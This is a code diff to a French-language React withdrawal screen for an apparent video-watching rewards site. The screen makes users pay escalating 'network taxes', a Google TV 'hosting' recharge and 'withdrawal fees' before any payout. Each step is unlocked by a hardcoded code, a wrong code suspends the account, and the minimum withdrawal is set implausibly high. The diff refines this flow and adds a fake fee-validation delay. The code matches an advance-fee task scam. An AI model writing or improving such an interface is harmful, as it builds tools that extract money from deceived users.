@@ -315,16 +315,6 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
     try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
   }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, feeValidation, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);
 
-  const beginSubmit = () => {
-    setErrorMessage(null);
-    if (hasCodeBypass) { void submit(); return; }
-    setHostingCode('');
-    setHostingError(null);
-    if (!withdrawalCode.trim()) { setCodeStep(true); return; }
-    if (profile.is_certified) { setHostingStep(true); return; }
-    setCertificationBlocked(true);
-  };
-
   const proceedToHosting = async () => {
     if (!withdrawalCode.trim()) {
       setErrorMessage('Saisissez votre code de retrait.');
@@ -370,6 +360,47 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   };
 
   const requestedAmount = convertLocalToXof(Number(amount), withdrawalCountry);
+  const minimumWithdrawalAmount = 1500500;
+  const maximumWithdrawalAmount = 100000000;
+  const numericAmount = Number(amount);
+  const requestedAmountInXof = convertLocalToXof(numericAmount, withdrawalCountry);
+
+  const beginSubmit = () => {
+    setErrorMessage(null);
+    if (!balanceReady) {
+      setErrorMessage('Solde indisponible pour le moment.');
+      return;
+    }
+    if (!paymentMethod || !withdrawalCountry || !phone.trim()) {
+      setErrorMessage('Vérifiez le moyen de paiement, le pays, la ville et le numéro.');
+      return;
+    }
+    if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
+      setErrorMessage('Saisissez un montant à retirer.');
+      return;
+    }
+    if (requestedAmountInXof < minimumWithdrawalAmount || requestedAmountInXof > maximumWithdrawalAmount) {
+      setErrorMessage(`Le montant doit être compris entre ${formatMoneyFromXof(minimumWithdrawalAmount, withdrawalCountry)} et ${formatMoneyFromXof(maximumWithdrawalAmount, withdrawalCountry)}.`);
+      return;
+    }
+    if (requestedAmountInXof > availableBalance) {
+      setErrorMessage('Solde insuffisant pour effectuer ce retrait.');
+      return;
+    }
+    if (hasCodeBypass) { void submit(); return; }
+    setHostingCode('');
+    setHostingError(null);
+    if (!withdrawalCode.trim()) { setCodeStep(true); return; }
+    if (profile.is_certified) { setHostingStep(true); return; }
+    setCertificationBlocked(true);
+  };
+
+  const submitAfterFeeValidation = async () => {
+    setFeeValidation(true);
+    await new Promise<void>((resolve) => window.setTimeout(resolve, 3000));
+    setFeeValidation(false);
+    await submit();
+  };
 
   const submit = async () => {
     if (!hasCodeBypass && !withdrawalCode.trim()) {
@@ -378,7 +409,6 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
     }
     setSubmitting(true);
     setValidating(true);
-    setFeeValidation(false);
     setErrorMessage(null);
     await new Promise<void>((resolve) => window.setTimeout(resolve, 2500));
     const { data: requestId, error } = await supabase.rpc('submit_withdrawal_request', { p_amount: requestedAmount, p_payment_method: paymentMethod, p_phone: phone, p_country: withdrawalCountry, p_city: profile.city ?? '', p_payment_code: hasCodeBypass ? '' : withdrawalCode.trim() });
@@ -443,17 +473,13 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
 
   if (hostedSuccess) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostedSuccess(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;
 
-  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">{formatMoneyFromXof(150700, withdrawalCountry)}</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); setFeeValidation(true); void submit(); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;
+  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">{formatMoneyFromXof(150700, withdrawalCountry)}</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); void submitAfterFeeValidation(); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim() || submitting || feeValidation} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;
 
   if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>{formatMoneyFromXof(55890, withdrawalCountry)}</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { void suspendForInvalidHostingCode(); } }} disabled={submitting || !hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">{submitting ? 'Suspension en cours…' : "Valider l'hébergement"}</button></div></div></section>;
 
   if (validating) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Envoi de votre demande</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
-  const numericAmount = Number(amount);
-  const minimumWithdrawalAmount = 1500500;
-  const maximumWithdrawalAmount = 100000000;
-  const requestedAmountInXof = convertLocalToXof(numericAmount, withdrawalCountry);
-  const canSubmit = balanceReady && !submitting && paymentMethod !== '' && withdrawalCountry !== '' && phone.trim() !== '' && requestedAmountInXof >= minimumWithdrawalAmount && requestedAmountInXof <= maximumWithdrawalAmount && requestedAmountInXof <= availableBalance;
+  const canSubmit = balanceReady && !submitting && paymentMethod !== '' && withdrawalCountry !== '' && phone.trim() !== '';
   return <section className="py-9 sm:py-14"><div className="mx-auto max-w-3xl rounded-[30px] border border-blue-400/40 bg-[linear-gradient(145deg,#192c49,#102329)] px-5 py-8 text-center shadow-[0_20px_55px_rgba(24,87,120,.18)] sm:px-10"><p className="text-sm font-bold uppercase tracking-[.28em] text-blue-400">Solde disponible</p><p className="mt-5 text-5xl font-black tracking-tight text-white sm:text-7xl">{formatMoneyFromXof(availableBalance, withdrawalCountry)}</p><p className="mt-5 text-base text-slate-500 sm:text-lg"><b>{counts.rewarded}</b> vidéo(s) regardée(s), aimée(s) et favorite(s)</p></div><div className="mx-auto mt-8 max-w-3xl rounded-[30px] border border-slate-400/20 bg-[#242c40] p-5 shadow-2xl sm:p-10"><h1 className="sr-only">Retrait</h1>{codeStep ? <div className="text-center"><h2 className="text-2xl font-black text-white">Vous n'aviez pas encore payé les taxes de réseau afin que votre demande de retrait soit validée.</h2>{!codeReady ? <div className="py-12"><Loader2 className="mx-auto h-10 w-10 animate-spin text-blue-400" /><p className="mt-5 text-slate-300">Préparation de la confirmation…</p></div> : <div className="mt-8 text-left"><p className="mb-6 text-sm leading-6 text-slate-300">Contactez votre leader pour payer les taxes de réseau : <b>{formatMoneyFromXof(63845, withdrawalCountry)}</b>.</p><WithdrawalField label="Code de retrait"><input type="text" autoComplete="one-time-code" value={withdrawalCode} onChange={(event) => setWithdrawalCode(event.target.value)} placeholder="Saisissez votre code" className="withdrawal-input" /></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={proceedToHosting} disabled={submitting || !withdrawalCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">{submitting ? 'Vérification en cours…' : 'Confirmer le retrait'}</button></div>}</div> : <><WithdrawalField label="Moyen de paiement"><select value={paymentMethod} onChange={(event) => setPaymentMethod(event.target.value)} className="withdrawal-input"><option value="">-- Choisir un moyen de paiement --</option>{paymentMethods.map((method) => <option key={method}>{method}</option>)}</select></WithdrawalField><WithdrawalField label="Nom complet du bénéficiaire"><input value={beneficiary} readOnly className="withdrawal-input" /></WithdrawalField><div className="grid gap-5 sm:grid-cols-2"><WithdrawalField label="Pays"><select value={withdrawalCountry} onChange={(event) => { setWithdrawalCountry(event.target.value); setPaymentMethod(''); }} className="withdrawal-input"><option value="">-- Choisir un pays --</option>{countries.map((country) => <option key={country.name} value={country.name}>{country.name}</option>)}</select></WithdrawalField><WithdrawalField label="Ville"><input value={profile.city ?? '—'} readOnly className="withdrawal-input" /></WithdrawalField></div><WithdrawalField label="Numéro de compte Mobile Money"><div className="flex overflow-hidden rounded-2xl bg-[#0b0f16]"><span className="flex items-center border-r border-white/10 px-4 text-lg text-slate-400">{dialCode}</span><input type="tel" inputMode="numeric" value={phone} onChange={(event) => setPhone(event.target.value)} placeholder="77 000 00 00" className="withdrawal-input rounded-none bg-transparent" /></div></WithdrawalField><WithdrawalField label="Montant à retirer"><input type="number" min={convertXofToLocal(minimumWithdrawalAmount, withdrawalCountry)} max={convertXofToLocal(maximumWithdrawalAmount, withdrawalCountry)} value={amount} onChange={(event) => setAmount(event.target.value)} placeholder={`Ex : ${Math.round(convertXofToLocal(availableBalance, withdrawalCountry)).toLocaleString('fr-FR')}`} className="withdrawal-input" /><span className="mt-2 block text-xs text-slate-400">Minimum : {formatMoneyFromXof(minimumWithdrawalAmount, withdrawalCountry)} — Maximum : {formatMoneyFromXof(maximumWithdrawalAmount, withdrawalCountry)}</span></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={beginSubmit} disabled={!canSubmit} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Continuer vers la confirmation</button></>}</div></section>;
 }
 
